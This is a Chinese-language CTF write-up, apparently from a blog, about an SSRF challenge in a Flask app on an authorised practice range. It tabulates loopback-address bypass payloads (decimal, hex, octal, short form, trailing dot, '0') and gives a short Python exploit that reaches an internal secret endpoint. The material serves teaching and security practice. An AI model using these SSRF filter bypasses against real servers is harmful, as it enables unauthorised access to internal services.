---
title: CTF2 实践靶场 - Web - Python 里的 SSRF
date: 2026-11-14 18:42:00
categories:
  - CTF
  - CTF2 实践靶场
  - Web
tags:
  - SSRF
  - IP绕过
  - 内网探测
  - Flask
cover: /img/cover/petal-smiley-faces.jpg
description: CTF2 靶场 Web 题，首页 url 参数构成 SSRF，内部接口仅本机可访问且过滤 127.0.0.1 等写法，用 0 解析为 0.0.0.0 绕过字符串黑名单访问内部 8000 端口拿 flag。
keywords:
  - SSRF
  - 0.0.0.0
  - 127.0.0.1绕过
  - 内网接口
  - Python
ai: >-
  本题是 CTF2 实践靶场收录的 NU1L《从 0 到 1：CTFer 成长之路》配套 Web 题，考点为服务端请求伪造。首页提示 url 参数是必填项，服务端会按用户提供的 URL 发起请求；题目描述给出的内部接口只有特定本机 IP 能访问，直接访问会返回不允许并暴露容器内网地址。由此确认 url 是一个 SSRF 出口，尝试让它请求 127.0.0.1 的内部端口时被明确拦截，说明服务端对目标做了字符串黑名单过滤。解题关键是穷举本机地址的各种等价写法：十进制、十六进制、八进制、短形式、localhost 加尾点等都被同样的规则挡下，唯独把目标写成 0 时，IP 解析会将其解释为 0.0.0.0，即指向本机所有网卡的统配地址，既绕过了对 127.0.0.1 与 localhost 的字符串匹配，又让服务端以本机身份访问到内部 8000 端口上的 secret 接口，从而返回 flag。全题重点在于理解地址解析与黑名单过滤之间的语义差异。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CTF2 实践靶场（NU1L《从 0 到 1：CTFer 成长之路》配套题） |
| 方向 | Web（第 03 章 Web 进阶） |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

漏洞类型：SSRF（Server-Side Request Forgery）。

## 信息收集

访问首页 `/` 返回：

```text
url parameter is required
```

说明存在一个需要 `url` 参数的端点。访问题目描述提示的内部接口 `/api/internal/secret`：

```text
your ip <内网地址> is not allowed
```

> 内网地址已脱敏：该接口只允许特定 IP（本机）访问，错误信息泄露了容器内网 IP。

说明该内部接口只允许特定 IP（本机）访问。

## 漏洞分析

### SSRF 点确认

`url` 参数是一个 SSRF 点，服务端会请求用户提供的 URL。直接尝试：

```text
/?url=http://127.0.0.1:8000/api/internal/secret
```

返回：

```text
127.0.0.1 is forbidden
```

说明服务端对 SSRF 目标做了过滤，禁止访问 `127.0.0.1` / `localhost`。

### 绕过过滤

测试多种 `127.0.0.1` 的绕过形式：

| Payload | 结果 |
|---|---|
| `http://127.0.0.1:8000/...` | `127.0.0.1 is forbidden` |
| `http://localhost:8000/...` | `127.0.0.1 is forbidden` |
| `http://2130706433:8000/...`（十进制） | `127.0.0.1 is forbidden` |
| `http://0x7f000001:8000/...`（十六进制） | `127.0.0.1 is forbidden` |
| `http://0177.0.0.1:8000/...`（八进制） | `127.0.0.1 is forbidden` |
| `http://127.1:8000/...`（短形式） | `127.0.0.1 is forbidden` |
| `http://localhost.:8000/...`（尾点） | `127.0.0.1 is forbidden` |
| `http://0:8000/api/internal/secret` | 成功返回 flag |

**关键绕过**：`http://0:8000/api/internal/secret`

`0` 在 IP 解析中会被解释为 `0.0.0.0`，指向本机（所有网卡的统配地址），从而绕过了对 `127.0.0.1` / `localhost` 的字符串过滤，服务端以本机身份访问了内部 8000 端口。

## 利用过程

1. 由首页提示确认 `url` 参数，由内部接口报错确认存在仅本机可访问的 8000 端口服务。
2. 直接打 `127.0.0.1` 被拦，判定为字符串黑名单。
3. 穷举等价地址写法，发现 `0` 不被黑名单覆盖且解析为 `0.0.0.0`。
4. 提交 `url=http://0:8000/api/internal/secret`，服务端以本机身份请求内部接口，返回 flag。

## 完整 EXP

```python
import requests
r = requests.get(
    "http://target:8080/",
    params={"url": "http://0:8000/api/internal/secret"}
)
print(r.text)  # flag{xxxx}
```

## Flag

脱敏后：`flag{xxxx}`。原值为真实 flag 值，经 `url=http://0:8000/api/internal/secret` 触发 SSRF 从内部接口返回。

## 踩坑与总结

| 要点 | 说明 |
|---|---|
| SSRF 点 | Flask 应用 `url` 参数，服务端请求用户提供的 URL |
| 过滤 | 禁止 `127.0.0.1` / `localhost` 的字符串形式 |
| 绕过 | `0` → `0.0.0.0`（本机统配地址），绕过字符串过滤 |
| 内部接口 | 8000 端口 `/api/internal/secret`，只允许本机 IP 访问 |

1. 黑名单若只匹配字面量 `127.0.0.1` / `localhost`，会漏掉 `0` 这类等价解析形式。
2. `0`、`0.0.0.0` 在多数 IP 解析中都指向本机，是 SSRF 绕过常用手法。
3. 十进制、十六进制、八进制、短形式、尾点等已知写法被一一挡下，说明过滤是「枚举式」而非「解析后归一化」；用未列入的写法即可突破。
4. 内网接口只允许本机访问的设计，配合 SSRF 反而成为「以服务端身份访问」的跳板。
